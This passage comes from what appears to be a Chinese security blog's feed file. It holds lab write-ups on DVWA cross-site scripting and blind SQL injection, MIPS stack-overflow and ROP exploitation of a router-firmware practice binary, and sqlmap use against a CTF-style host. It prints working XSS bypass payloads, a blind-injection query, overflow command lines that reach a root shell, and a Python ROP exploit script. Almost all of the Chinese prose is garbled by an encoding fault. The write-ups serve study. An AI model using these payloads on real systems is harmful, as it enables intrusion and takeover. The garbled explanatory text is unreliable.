$result-&gt;fetch_assoc()) &#123; // Do something with $row&#125; PDOÁúüÁöÑÊòØÂÆâÂÖ®ÁöÑÂêóÔºü Are PDO prepared statements sufficient to prevent SQL injection? SQL injection that gets around mysql_real_escape_string() XSS reflected Á¨¨‰∏ÄÈÅçÂú®chrome‰∏äËØï‰∫Ü‰∏ã&lt;script&gt;alert(1)&lt;/script&gt;Ê≤°ÊàêÂäü ‰ΩÜÊòØÁúãÊ∫êÁ†ÅÔºö ÂèØËÉΩÊòØchromeÂ§™ÂÆâÂÖ®‰∫ÜÂêß Êç¢ÊàêfirefoxÂ∞±Ê≤°‰∫ã‰∫Ü medium Â¶ÇÊûúÁúãÊ∫êÁ†ÅÂ∞±‰ºöÂèëÁé∞Âè™ÊòØÁÆÄÂçïÂú∞ÂØπscriptËøõË°å‰∫Ü‰∏ÄÊ¨°ËøáÊª§ $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); ÈÇ£‰πàÂ¶Ç‰ΩïÁªïËøáËøô‰∏™ÈôêÂà∂Âë¢ ÈÇ£Â∞±ËøôÊ†∑ÊûÑÈÄ† &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt; Â∞±ËÉΩÁªïËøáËøáÊª§‰∫ÜÔºå‰∏ªË¶ÅÈóÆÈ¢òËøòÊòØËøáÊª§‰∏ç‰∏•Ê†ºÔºå‰πãËøáÊª§‰∫Ü‰∏ÄÊ¨°ÔºåÊâÄ‰ª•ÂèåÂÜôÂ∞±ËÉΩÂæàÂÆπÊòìÂú∞ÁªïËøá‰∫Ü ps. Â§ßÂ∞èÂÜô‰πüÂèØ‰ª• high ËøôÊ¨°ËøáÊª§Êõ¥‰∏•Ê†º‰∫Ü $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); ÊúÄÂêéÂè™Áïô‰∫Ü‰∏Ä‰∏™&gt;Áªô‰Ω† ÊûúÁÑ∂ÊàëËÆ∞ÂæóËøòÊúâimgÊ†áÁ≠æ‰πüÂèØ‰ª•ÈÄ†ÊàêxssÊù•ÁùÄ &lt;img src=&quot;aa&quot; onError=alert(123) &gt; ËøôÊ†∑Â∞±Ë°åÂï¶ÔºåÂΩìÁÑ∂chromeÂ§™ÂÆâÂÖ®‰∫ÜÔºåËøòÊòØÁî®firefoxÂêß impossible 1234567checkToken( $_REQUEST[ &apos;user_token&apos; ],$_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );// Feedback for end user$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; ËøôÁßçÊÉÖÂÜµ‰∏ãËøòËøõË°å‰∫ÜÂÆû‰ΩìÁºñÁ†ÅÔºåÁúã‰Ω†ÊÄé‰πàÁªïËøá ÈÇ£‰∫õÂπ¥Êàë‰ª¨Ê≤°ËÉΩbypassÁöÑxss filter ‰∏ÄÁØáÊÄªÁªì‰∫ÜxssÁöÑÊñáÁ´† sql Áõ≤Ê≥® ‰ªélowÂºÄÂßãÁúãËµ∑Ôºå Áõ¥Êé•ÊäìÂåÖÁÑ∂ÂêéÂ∞ÜÊï∞ÊçÆÂåÖ‰øùÂ≠òËµ∑Êù•ÔºåÁî®sqlmapË∑ë‰∏Ä‰∏ãÂ∞±Â∞±Âá∫Êù•‰∫ÜÔºå-rÂèÇÊï∞ÊòØËØªÂèñ‰∏Ä‰∏™Êï∞ÊçÆÂåÖ‰∏≠ÁöÑÊñá‰ª∂ÔºåÁÑ∂Âêésqlmap‰ºöËá™Âä®Ëß£ÊûêÂÆÉ mediume ‰∏ÄÊ†∑ÁöÑÔºåÂè™ÊòØÊï∞ÊçÆÂåÖÂèòÊàê‰∫ÜpostÊñπÂºèÊèê‰∫§ÁöÑ high ËøôÊ¨°sqlmapÊäΩÈ£éÊ≤°Ë∑ëÂá∫Êù• Áúã‰∏ãÊ∫êÁ†ÅÂ•Ω‰∫Ü Êú¨Êù•Áõ≤Ê≥®Â∞±ÊòØË¶ÅÈÄöËøáËÑöÊú¨Êù•Ë∑ëÁöÑÔºå‰ΩÜÊòØÊàëÊØîËæÉÊáíemmmÔºåËøòÊòØË¶ÅÂ§ç‰π†‰∏Ä‰∏ãÂ¶Ç‰ΩïÁî®pythonËÑöÊú¨Ë∑ëÂá∫Êù• Â¶Ç‰ΩïÁõ≤Ê≥®Ôºü ‰∏ÄÁØáÊñáÁ´†Â∏¶‰Ω†Ê∑±ÂÖ•ÁêÜËß£ SQL Áõ≤Ê≥® Áõ≤Ê≥®ÊúÄÂ∏∏ËßÅÁöÑ‰∏Ä‰∏™payload 127.0.0.1/sqllib/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80‚Äì+ Âà§Êñ≠Êï∞ÊçÆÂ∫ì‰∏≠Á¨¨‰∏Ä‰∏™Ë°®ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶‰∏∫Âê¶‰∏∫'P' xss Â≠òÂÇ®Âûã ËøòÊòØÊúÄÁÆÄÂçïÁöÑlow Ë°®Âçï‰∏äÁöÑnameÊúâÈïøÂ∫¶ÈôêÂà∂Ôºå‰∏çËøáËøôÂè™ÊòØÂâçÁ´ØÁöÑÈôêÂà∂ËÄåÂ∑≤ &lt;div id=&quot;guestbook_comments&quot;&gt;Name: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;Message: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;&lt;/div&gt; Ê≥®ÂÖ•ÊàêÂäü medium ËøôÂ∞±ÂæàÂ∞¥Â∞¨‰∫Ü„ÄÇ„ÄÇ ÂéüÊù•ËøôÂ∞±ÊòØÂ≠òÂÇ®ÂûãxssÁöÑÂéâÂÆ≥‰∫ÜÔºåÁõ¥Êé•Â≠òËøõÂéª‰∫ÜÔºåÊâÄ‰ª•ÊàëÊâìÂºÄmediumÁöÑÈ°µÈù¢Êó∂ÔºåËøûÁùÄÂºπÂá∫‰∫Ü‰∏§‰∏™Ê°ÜÊ°ÜÔºå‰∫éÊòØÊÉ≥Áúã‰∏Ä‰∏ãÂÆÉÁöÑÊ∫êÁ†ÅÔºö ËøôÈáå‰πüÊòØÈÄöËøáÂ§ßÂ∞èÂÜôÊàñËÄÖÂèåÂÜôÂ∞±ËÉΩÁªïËøáÁöÑ &lt;sCriPt&gt;alert(1)&lt;/script&gt; ÊâæÂà∞‰∫Ü‰∏Ä‰∏™xssÂπ≥Âè∞ xssÂπ≥Âè∞ ‰ΩÜÊòØÊàëÂèëÁé∞Êàë‰∏ç‰ºöÁî®‰∫Ü„ÄÇ„ÄÇ]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT Ê†àÊ∫¢Âá∫Á¨îËÆ∞]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[MIPSÊ†àÊ∫¢Âá∫ x86ÂíåMIPSÊåá‰ª§ÈõÜ Âú®ÊàëÁöÑÁêÜËß£ÁúãÊù•Ôºåx86ÂØπ‰∫éÊ†àÁöÑÊìç‰ΩúÂ§ö‰∫ÜpushÂíåpopÊìç‰ΩúÔºåËÄåMIPSÊåá‰ª§ÈõÜÂπ∂Ê≤°ÊúâËøô‰∫õÔºåÂêåÊó∂‰∏§ËÄÖ‰∏Ä‰∏™ÊòØÂ∞èÁ´ØÂ∫èÔºå‰∏Ä‰∏™ÊòØÂ§ßÁ´ØÂ∫èÔºå‰ΩÜÊòØ‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÔºåÂú®Ë∞ÉËØïÁ®ãÂ∫èÁöÑÊó∂ÂÄô‰æùÊóßÁî®ÁöÑÊòØÂ∞èÁ´ØÂ∫èemmmm MISPÊåá‰ª§ÈõÜÂ≠òÂú®Ê†àÊ∫¢Âá∫ÁöÑÂéüÂõ† Âè∂Â≠êÂáΩÊï∞ÂíåÈùûÂè∂Â≠êÂáΩÊï∞ Âè∂Â≠êÂáΩÊï∞ÁöÑËøîÂõûÂú∞ÂùÄÊòØÁõ¥Êé•ÊîæÂú® ra ÂØÑÂ≠òÂô®‰∏≠ÔºåËÄåÈùûÂè∂Â≠êÂáΩÊï∞ÈúÄË¶ÅË∞ÉÁî®Âè¶Â§ñÁöÑÂáΩÊï∞ÔºåËøôÈáåÁöÑÂ∑ÆÂºÇÂ∞±ÁÖßÊàê‰∫ÜÈùûÂè∂Â≠êÂáΩÊï∞ÈúÄË¶ÅÊääÂΩìÂâçÁöÑËøîÂõûÂú∞ÂùÄÊöÇÊó∂Â≠òÊîæÂú®Ê†à‰∏ä ÂÆûÈ™åÁéØÂ¢É attifyOSËôöÊãüÊú∫ÔºåÂü∫Êú¨ÂÜÖÁΩÆ‰∫ÜÊàëÈúÄË¶ÅÁöÑÊâÄÊúâÂ∑•ÂÖ∑ÔºåÂΩìÁÑ∂ÂÖ∂‰∏≠ÁöÑIDA‰ºº‰πéËøáÊúü‰∫ÜÔºåÂéªÂêæÁà±Á†¥Ëß£‰∏äÊâæ‰∫Ü‰∏Ä‰∏™LinuxÁâàÊú¨ÁöÑIDAÂÆâË£Ö‰∫Ü ÂêæÁà±Á†¥Ëß£ÈìæÊé• MIPSÂä®ÊÄÅË∞ÉËØï ‰ΩøÁî®qemu-mipselÊàñËÄÖqemu-mipsel-staticËøõË°åË∞ÉËØïÔºåqemuÊîØÊåÅ‰ΩøÁî®gdbËøõË°åË∞ÉËØïÔºå-gÈÄâÈ°πÂºÄÂêØ‰∏Ä‰∏™Á´ØÂè£ÔºåIDAÂèØ‰ª•ËøûÊé•‰∏äËøô‰∏™Á´ØÂè£‰ªéËÄåËøõË°åÂä®ÊÄÅË∞ÉËØï„ÄÇ‰πãÂâçÂú®ÁúãÈõ™ÁöÑËôöÊãüÊú∫‰∏äÂè™ËÉΩÁî®qemu-mipsel-staticË∞ÉËØïÔºåÂêéÊù•Êç¢Êàê‰∫ÜattifyOSÂèëÁé∞‰∏§ËÄÖÈÉΩË°å„ÄÇ‰∏çËøáÂ¶ÇÊûúÁº∫Â∞ëÂä®ÊÄÅÈìæÊé•Â∫ìÁöÑËØùËøòÊòØÈúÄË¶ÅchrootÂêåÊó∂Â∞ÜÁõ∏Â∫îÁöÑÂ∫ìÊã∑Ë¥ùËøáÊù•„ÄÇ ÁÆÄÂçïÁöÑÊ†àÊ∫¢Âá∫ Ê∫êÁ†ÅÔºö 123456789101112131415#include &lt;stdio.h&gt;void vuln()&#123; system(&quot;/bin/sh&quot;);&#125;void has_stack(char *src)&#123; char dst[20] = &#123;0&#125;; strcpy(dst,src); printf(&quot;copy success!n&quot;);&#125;void main(int argc,char *argv[])&#123; has_stack(argv[1]);&#125; ‰ΩøÁî®mipsel-linux-gccËøõË°åÁºñËØë mipsel-linux-gcc ./stack01.c -o stack01 -static ÁºñËØë‰πãÂêéÂæóÂà∞Ôºö root@ubuntu:~/stack# file stack01 stack01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped ‰ΩøÁî®IDAÊü•ÁúãÂèçÊ±áÁºñÔºö Áî±‰∫émainÂáΩÊï∞‰∏≠Ë∞ÉÁî®‰∫ÜÂÖ∂‰ªñÁöÑÂáΩÊï∞ÔºåÊâÄ‰ª•mainÂáΩÊï∞ÂøÖÁÑ∂ÊòØÈùûÂè∂Â≠êÂáΩÊï∞ÔºåÂΩìÁÑ∂ËøôÈáåÊàë‰ª¨‰∏çÊòØË¶ÜÁõñmainÂáΩÊï∞ÁöÑËøîÂõûÂú∞ÂùÄÔºåÂõ†‰∏∫has_stackÂáΩÊï∞‰πüÊòØÈùûÂè∂Â≠êÂáΩÊï∞ÔºåËÄå‰∏îstrcpyÊ≤°ÊúâÂØπÈïøÂ∫¶ÂÅöÈôêÂà∂„ÄÇ strcpyÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞dstÂ≠òÊîæÂú®$a0‰∏≠ÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞srcÂ≠òÊîæÂú®$a1‰∏≠Ôºå 123456789.text:00400410 sw $zero, 0x38+var_10($fp).text:00400414 addiu $v0, $fp, 0x38+var_20 #Ë¶ÅÊã∑Ë¥ùÂà∞ÁöÑÂú∞Êñπ.text:00400418 move $a0, $v0.text:0040041C lw $a1, 0x38+arg_0($fp) # Ë¶ÅÊã∑Ë¥ùÁöÑÂÜÖÂÆπ.text:00400420 la $v0, strcpy.text:00400424 move $t9, $v0.text:00400428 jalr $t9 ; strcpy.text:0040042C nop.text:00400430 lw $gp, 0x38+var_28($fp) ÂÅ∑Êáí‰∏ÄÁÇπ‰∏ç‰ªîÁªÜÂàÜÊûêÊ†à‰∫Ü ‰ΩøÁî®patternLocOffset.pyÂ∑•ÂÖ∑ÁîüÊàêÈïøÂ∫¶‰∏∫30ÁöÑÂ≠óÁ¨¶‰∏≤ 12345/home/oit [oit@ubuntu] [4:31]&gt; python patternOffset.py -c -l 30[*] Create pattern string contains 30 characters ok![+] output to patternShell.txt ok![+] take time: 0.0004 s Âä®ÊÄÅË∞ÉËØïÔºö ./qemu-mipsel-static -g 1234 ./stack01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9 Áõ¥Êé•Âú®Ë∞ÉÁî®ÂáΩÊï∞ËøîÂõûÁöÑÂú∞Êñπ‰∏ãÊñ≠ÁÇπÔºåÊü•ÁúãÊ≠§Êó∂ÁöÑ$raÂØÑÂ≠òÂô®ÁöÑÂÄº 12345.text:00400450 move $sp, $fp.text:00400454 lw $ra, 0x38+var_4($sp).text:00400458 lw $fp, 0x38+var_8($sp).text:0040045C addiu $sp, 0x38.text:00400460 jr $ra (Êñ≠ÁÇπ) ËÆ°ÁÆóÈúÄË¶ÅpaddingÁöÑÈïøÂ∫¶ 12345&gt; python patternOffset.py -s 0x62413961 -l 30[*] Create pattern string contains 30 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 28 (adjusted another-endian)[+] take time: 0.0008 s ÈúÄË¶ÅÂ°´ÂÖÖ28‰∏™Â≠óËäÇ ÊúÄÂêéÁöÑpayload ./qemu-mipsel-static -g 1234 ./stack01 `python -c &quot;print 'a'*28+'\x90\x03\x40\x00'&quot;` Ê≠§Êó∂ÊàêÂäüÂú∞ÂèëÁîü‰∫ÜË∑≥ËΩ¨ 12345root@ubuntu:~/stack# ./qemu-mipsel-static ./stack01 `python -c &quot;print &apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`# lscore qemu-mipsel-static stack01 stack01.id0 stack01.idb stack01.tilqemu-mipsel ret2txt.c stack01.c stack01.id1 stack01.nam# whoamiroot ROP chain 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void do_system_0(int code,char *cmd)&#123; char buf[255]; //sleep(1); system(cmd);&#125;void main()&#123; char buf[256]=&#123;0&#125;; char ch; int count = 0; unsigned int fileLen = 0; struct stat fileData; FILE *fp; if(0 == stat(&quot;passwd&quot;,&amp;fileData)) fileLen = fileData.st_size; else return 1; if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL) &#123; printf(&quot;Cannot open file passwd!n&quot;); exit(1); &#125; ch=fgetc(fp); while(count &lt;= fileLen) &#123; buf[count++] = ch; ch = fgetc(fp); &#125; buf[--count] = &apos;x00&apos;; if(!strcmp(buf,&quot;adminpwd&quot;)) &#123; do_system_0(count,&quot;ls -l&quot;); &#125; else &#123; printf(&quot;you have an invalid password!n&quot;); &#125; fclose(fp);&#125; Ê≠§Â§ÑmainÂáΩÊï∞ÊòéÊòæÊòØÈùûÂè∂Â≠êÂáΩÊï∞ÔºåÊàë‰ª¨Ë¶ÅÊÉ≥ÂäûÊ≥ïË∞ÉÁî®do_system_0Ëøô‰∏™ÂáΩÊï∞ ÈÇ£Â∞±Ë¶ÅÊÉ≥ÂäûÊ≥ïÊéßÂà∂$a1ÂØÑÂ≠òÂô®ÔºåÈÇ£Ê†∑Â∞±ÂèØ‰ª•ÊâßË°å‰ªª‰ΩïÂëΩ‰ª§ mipsrop.stackfinder() Êü•Êâægadget Êàë‰ª¨ÈÄâÊã© 0x00403660 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp) Ë¶ÅÂÅöÂà∞Ë∑≥ËΩ¨Âà∞Êàë‰ª¨ÁöÑgadgetÔºåÈúÄË¶ÅË¶ÜÁõñmainÂáΩÊï∞ÁöÑËøîÂõûÂú∞ÂùÄ ÂÖàËÆ°ÁÆóË¶ÅpaddingÁöÑÈïøÂ∫¶ Ê≠§Êó∂ËÆ°ÁÆóÂá∫Êù•ÁöÑpatternÊòØ412Ôºå‰ºö‰∏ç‰ºöÂ§™Èïø‰∫ÜÁÇπ(Ê≥®ÔºöÂú®ÊàëÂèÇËÄÉÁöÑÊñáÁ´†‰∏≠‰ΩúËÄÖËÆ°ÁÆóÂá∫Êù•ÁöÑÂÅèÁßªÂíåÊàëÁöÑ‰∏ç‰∏ÄÊ†∑ÔºåÂàöÂºÄÂßãÊàë‰ª•‰∏∫ÊòØËá™Â∑±ËÆ°ÁÆóÈîô‰∫ÜÔºå‰ΩÜÊòØÂêéÊù•Ë∞ÉËØïÂêéËÆ§‰∏∫Ëá™Â∑±Âπ∂Ê≤°ÊúâÁÆóÈîô) Êé•‰∏ãÊù•ÊàëÂ∞ùËØïÂÖàË¶ÜÁõñmainÂáΩÊï∞ÁöÑËøîÂõûÂú∞ÂùÄ Ë∑≥ËΩ¨Âà∞ropÁöÑÁ©∫Èó¥ÔºåÂÜçÂ∞Ü/bin/shÂ≠óÁ¨¶‰∏≤ÁöÑÂú∞ÂùÄËµãÂÄºÁªô$a1 $raË¢´Ë¶ÜÁõñ f7ÂçïÊ≠•‰∏ÄÊ¨°ÔºåË∑≥ËΩ¨Âà∞gadget ËÄå‰∏îÊ≠§Êó∂Ê†àÁ©∫Èó¥Â∑≤ÁªèÂ∏ÉÁΩÆÂ•Ω‰∫Ü addiu $a1, $sp, 0x58+var_40Áõ∏ÂΩì‰∫é $a1 = $sp+0x18 Ê≠§Êó∂$sp+0x18Â≠òÊîæÁöÑÂ∞±ÊòØ/bin/shÂ≠óÁ¨¶‰∏≤ÁöÑÂú∞ÂùÄ ÁÑ∂ËÄå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πà Ëøô‰∏™ÈîôËØØÂ∞±Âæà‰∏çÊòé‰∏çÁôΩ‰∫Ü ÈáçÊñ∞ÂõûÈ°æ‰∫Ü‰∏Ä‰∏ã„ÄäÊè≠ÁßòÂÆ∂Áî®Ë∑ØÁî±Âô®0dayÊºèÊ¥ûÊåñÊéòÊäÄÊúØ„ÄãÔºåÁúãÂà∞‰∫Ü‰ΩúËÄÖÂÜôÁöÑ‰∏Ä‰∏™exp Â∞ÜgadgetÁöÑÂú∞ÂùÄÊõøÊç¢ÊàêÊàëÁöÑÔºåÂ¶Ç‰∏ãÔºö 12345678910111213141516171819202122import structcmd = &quot;sh&quot;cmd += &quot;\x00&quot;*(4-len(cmd)%4)shellcode = &quot;A&quot;*0x19cshellcode+= struct.pack(&quot;&gt;L&quot;, 0x00403660) #gadgetÂú∞ÂùÄÔºå‰ΩúËÄÖÂÜôÁöÑÊòØ&quot;&lt;L&quot;‰ΩÜÊòØÊàëÂ∞ùËØï‰πãÂêéÂèëÁé∞Âú∞ÂùÄÊòØÂèçÁöÑÔºåÊâÄ‰ª•Êç¢ËøáÊù•‰∫Üshellcode+=&quot;A&quot;*24shellcode+=cmdshellcode+=&quot;B&quot;*(0x3C-len(cmd))shellcode+=struct.pack(&quot;&gt;L&quot;, 0x00400390) # do_system_0ÂáΩÊï∞Âú∞ÂùÄshellcode+=&quot;BBBB&quot;print &quot;ok&quot;print &quot;[+] create password file&quot;fw = open(&apos;passwd&apos;, &apos;w&apos;)fw.write(shellcode)fw.close()print &apos;ok&apos; ÁîüÊàêpasswdÊñá‰ª∂‰πãÂêéÔºå./qemu-mipsel-static -g 1234 ./vuln_systemËøõË°åË∞ÉËØï ÂΩìÁ®ãÂ∫èË∑≥ËΩ¨Âà∞gadgetÊó∂ÔºåÂèòÊàê‰∫ÜËøôÊ†∑Ôºå Ê≠§Êó∂ÁúãÁªàÁ´ØÔºö ÊàëÂ±ÖÁÑ∂ÊàêÂäü‰∫ÜÔºüÔºüÊ≠§Êó∂Â∑≤ÁªèÊãøÂà∞‰∫ÜrootÊùÉÈôê Á°ÆÂÆûÊ≤°ÊúâÁúãÈîôÔºåÈáçÊñ∞ËøêË°å‰∏ÄÈÅçÁ®ãÂ∫èÔºåÁ°ÆÂÆûÊãøÂà∞‰∫ÜshellÊùÉÈôê DVRF ÁªÉ‰π† Ëøô‰∏™Âú®attifyOS‰∏äÂ∑≤Áªè‰∏ãËΩΩÂ•Ω‰∫ÜÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•ÂéªGitHub‰∏äclone‰∏Ä‰ªΩÔºå‰∏Ä‰∏™Âæà‰∏çÈîôÁöÑÈ°πÁõÆ Êù•ÁúãIntroÁöÑstack_bof_01 Á®ãÂ∫è‰Ωç‰∫é/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/ Ê∫êÁ†Å‰Ωç‰∫é/home/oit/DVRF/Pwnable Source/Intro 1234567891011121314151617181920212223242526272829303132#include &lt;string.h&gt;#include &lt;stdio.h&gt;//Simple BoF by b1ack0wl for E1550int main(int argc, char **argv[])&#123;char buf[200] =&quot;\0&quot;;if (argc &lt; 2)&#123;printf(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n&quot;);exit(1);&#125;printf(&quot;Welcome to the first BoF exercise!\r\n\r\n&quot;);strcpy(buf, argv[1]);printf(&quot;You entered %s \r\n&quot;, buf);printf(&quot;Try Again\r\n&quot;);return 0x41; // Just so you can see what register is populated for return statements&#125;void dat_shell()&#123;printf(&quot;Congrats! I will now execute /bin/sh\r\n- b1ack0wl\r\n&quot;);system(&quot;/bin/sh -c&quot;);//execve(&quot;/bin/sh&quot;,&quot;-c&quot;,0);//execve(&quot;/bin/sh&quot;, 0, 0);exit(0);&#125; ÊòæÁÑ∂‰πüÊòØstrcpyÂáΩÊï∞Ê≤°ÊúâÈôêÂà∂Êã∑Ë¥ùÁöÑÈïøÂ∫¶ ËøêË°åÂÆÉÔºö 123root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01Usage: stack_bof_01 &lt;argument&gt;-By b1ack0wl Êàë‰ª¨Áõ¥Êé•ËÆ°ÁÆóÂÅèÁßªÂú∞ÂùÄ ÁîüÊàêÈïøÂ∫¶‰∏∫200ÁöÑÂ≠óÁ¨¶‰∏≤ 123456/home/oit [oit@ubuntu] [5:50]&gt; python patternOffset.py -s 0x41386741 -l 200[*] Create pattern string contains 200 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 204 (adjusted another-endian)[+] take time: 0.0042 s ÈÇ£Êàë‰ª¨ËØï‰∏ÄËØïÁõ¥Êé•Â°´ÂÖÖ 12root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# python -c &quot;print &apos;a&apos;*204+&apos;\x50\x09\x40\x00&apos;&quot; &gt; testroot@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 &quot;`cat test `&quot; Ê≠§Êó∂Â∑≤ÁªèÂ∞Ü$raÂØÑÂ≠òÂô®ÁöÑÂÄºË¶ÜÁõñÊéâ‰∫Ü ‰ΩÜÊòØ Âú®dat_shellÂáΩÊï∞‰∏≠ Êä•Èîô‰∫Ü ÊâÄ‰ª•ËøôÊó∂ÂÄôÈúÄË¶ÅÂÄüÂä©gadget ‰πãÂâçÂèÇËÄÉ‰∫ÜÂá†ÁØáÊñáÁ´†ÔºåÈÉΩÊòØÈÄöËøáÊü•ÊâælibcÁöÑÂü∫Âú∞ÂùÄÊù•Á°ÆËÆ§gadgetÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑÂú∞ÂùÄÁöÑÔºå‰ΩÜÊòØÊàëÂºÄÂßãË¶ÅgdbË∞ÉËØïÁöÑÊó∂ÂÄôÂπ∂Ê≤°ÊúâÁúãÂà∞libc.so.0ÁöÑÂä†ËΩΩÔºåÊâÄ‰ª•Êàë‰∏ÄÁõ¥ÊÄÄÁñëÊòØ‰∏çÊòØÊ≤°Âä†ËΩΩÔºåÁÑ∂ÂêéÁÑ∂ÂêéÔºåÁúãÂà∞ÂéüÁ®ãÂ∫è‰∏≠ÊòØÊúâputsÂíåmemsetËøô‰∫õÂáΩÊï∞ÁöÑÔºåÈÇ£ÊòæÁÑ∂ÊòØÂä†ËΩΩ‰∫ÜÁöÑ ‰∫éÊòØ‰∏ã‰∏Ä‰∏™Êñ≠ÁÇπÁÑ∂ÂêéË∞ÉËØï Áªà‰∫éÊâæÂà∞‰∫ÜlibcÁöÑÂä†ËΩΩÂü∫ÂùÄ ËøôÊ†∑Â∞±Â•ΩÂäû‰∫Ü python -c &quot;print 'a'*204+'\x20\x1b\x8a\x40'+'\x50\x09\x40\x00'&quot; &gt; test ‰πãÂêéËøêË°å okÂ∑≤ÁªèÊàêÂäü‰∫ÜÔºÅÔºÅÔºÅ 1234567root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1235 ./pwnable/Intro/stack_bof_01 &quot;`cat test`&quot;Welcome to the first BoF exercise!You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ÔøΩ@P @Try AgainCongrats! I will now execute /bin/sh- b1ack0wl ‰∏çËøá‰∏∫Âï•Áî®mipsropÊâæ‰∏çÂà∞Ëøô‰∏™gadgetÂë¢Ôºü ÂæàÁñëÊÉë Á°ÆËÆ§libcÂü∫ÂùÄÁöÑÊñπÊ≥ïÂ§ßÊ¶ÇÊúâÔºö vmmap cat /proc/pid/mapsÊü•ÁúãËøõÁ®ãÁöÑÂÜÖÂ≠òÂàÜÂ∏É Âú®IDA‰∏≠Êü•ÊâæÂà∞ÂáΩÊï∞ÁúüÊ≠£Âä†ËΩΩÁöÑ‰ΩçÁΩÆÔºåÁÑ∂ÂêéËÆ°ÁÆóÂÅèÁßª ÂèÇËÄÉ Ë∑ØÁî±Âô®ÊºèÊ¥ûÊåñÊéò‰πãÊ†àÊ∫¢Âá∫ÂÖ•Èó®Ôºà‰∏ÄÔºâ(ÊÑüËßâËøôÁØáÊñáÁ´†‰∏≠Á¨¨‰∫å‰∏™Á®ãÂ∫èË∞ÉËØïÁöÑ‰∏çÊòØÂæàÊ≠£Á°ÆÔºåÂõ†‰∏∫ÂÅèÁßªËÆ°ÁÆóÁöÑÈÉΩ‰∏ç‰∏ÄÊ†∑) Ë∑ØÁî±Âô®ÊºèÊ¥ûÊåñÊéò‰πãÊ†àÊ∫¢Âá∫ÂÖ•Èó®Ôºà‰∫åÔºâ]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰∏§ÈÅìsqlÊ≥®ÂÖ•È¢ò]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%2F</url>
    <content type="text"><![CDATA[Âü∫‰∫ésqlÁöÑÁõ≤Ê≥® ‰πãÂâç‰∏ÄÁõ¥Ê≤°ÊúâÂ•ΩÂ•ΩÂú∞Â≠¶‰π†ËøásqlmapÁöÑ‰ΩøÁî®ÊñπÊ≥ï Â¶ÇÊûúÊòØÈíàÂØπpostË°®ÂçïËøôÁßçÊñπÂºè ÂèØ‰ª•Â∞ÜÊäìÂà∞ÁöÑÂåÖ‰øùÂ≠òÊàê‰∏Ä‰∏™Êñá‰ª∂ÔºåÁÑ∂Âêé‰ΩøÁî® sqlmap.py -r &quot;post.txt&quot; -p n --dbs ÂÖ∂‰∏≠-pÊòØÊåáÂÆöÂèÇÊï∞ sqlmap‰πüÂèØ‰ª•Ëá™Âä®ÊêúÂØªË°®Âçïsqlmap.py -u &quot;url&quot; --forms ÊåáÂÆöÂèÇÊï∞ Ë∂ÅÊú∫Â≠¶Âà∞‰∫Ü‰∏ÄÊääsqlmap‰ΩøÁî® ËôΩÁÑ∂Ëøô‰∏™È¢òÁõÆÊòØÊúâÁÇπ„ÄÇ„ÄÇ ‰ΩÜÊòØÊ≥®ÂÖ•ÁÇπÁöÑÂà§Êñ≠‰πüÊòØÂæàÈáçË¶ÅÁöÑ ÁàÜÂêéÁ´ØÊï∞ÊçÆÂ∫ì python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; 